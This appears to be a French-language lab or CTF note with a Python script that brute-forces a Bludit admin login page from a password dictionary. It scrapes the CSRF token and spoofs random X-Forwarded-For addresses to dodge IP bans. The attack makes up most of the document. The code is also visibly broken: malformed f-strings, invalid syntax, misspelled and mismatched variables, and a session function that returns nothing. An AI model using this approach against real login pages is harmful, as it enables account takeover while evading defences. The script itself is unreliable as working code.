# Contexte

- Programme python essayant de bruteforcer une page de login à l'aide d'un dictionnaire.txt
- Utilisation d'une regex pour pouvoir récupérer un champs dans l'initialisation de session
- Utilisation de random pour pouvoir générer une nouvelle adresse IP sur un champs 'X-Forwarded-for' pour éviter de se faire ban ip suite au bruteforce
- Utilisation d'un dictionnairep pour renseigner les différent mdp à utiliser (on connais déjà l'user qui est fergus)
- Redirection des requêtes vers un proxy local pour analyser les requêtes et la façon dont elles sont construites = Vérifier qu'elles correspondent bien à des requêtes légitimes et compréhensibles pour le site en question.

# Script 

```py
import requests
import re
import random

HOST = '192.168.0.1'
USER = 'admin'
PROXY = {'http://127.0.0.1:8080'}

def init_session():
    # Return CSFR + Session Cookie
    r = requests.get('http://{HOST}}/admin') # On récupère la page /admin dans la variable "r"
    # On recherche la ligne contenant le champ qui nous intéresse dans la réponse "r" à l'aide d'une regex
    csfr = re.search(r'input type=hidden id="jstokenCSFR" name="tokenCSFR" value="([a-z0-9]*)"', r.text)
    csfr = csfr.group(1) # Sélection le champ dans la regex 
    # DEBUG CSRF : Return csrf + print (init_sesion()) pour débug
    cookie = r.cookies.get('BLUDIT-KEY')


def login(user,password):
    csrf,cookie=init_sesion()
    data = {
            'tokenCSFR':csfr,
            'username':user,
            'password':password,
            'save': }
    cookies = {
        'BLUDIT-KEY' = cookie
    }
    header = {
        'X-Forwarded-For' : f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }        
    p = requests.post('http://{HOST}}/admin/login', data=data, cookies=cookie, headers = header, proxies=PROXY, allow_redirects:False ) # On regarde les champs à renseigner grâce à BurpSuite en analysant la requête POST 
# On fait attention à l'adresse du POST et à tout les autres champs
    
    if p.status_code != 200:
        print(f"{USER}:{password}")
        return True
    elif "password incorrect" in p.text:
        return False
    elif "has been blocked" in p.text:
        print("IP BLOCKED")
        return False
    else:
        print (f"{USER}:{password}")



wordlist = open('dictionnaire.txt').readlines()
for line in wordlist:
        line=line.strip()
        login(USER,line)
        #print(line)
```

